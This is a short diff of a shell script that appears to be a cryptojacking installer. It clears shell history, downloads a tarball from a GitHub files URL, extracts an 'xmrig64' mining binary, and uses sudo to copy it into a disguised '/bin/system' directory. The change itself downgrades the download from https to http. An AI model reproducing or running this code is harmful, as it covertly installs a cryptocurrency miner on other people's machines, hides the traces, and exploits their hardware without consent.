@@ -4,7 +4,7 @@ history -c
 
 if [ $(uname --m) = "x86_64" ]
 then
-wget https://github.com/nicebbs/2/files/1915204/2.tar.gz
+wget http://github.com/nicebbs/2/files/1915204/2.tar.gz
 tar -xvf 2.tar.gz
 sudo mkdir /bin/system
 sudo  cp xmrig64 /bin/system
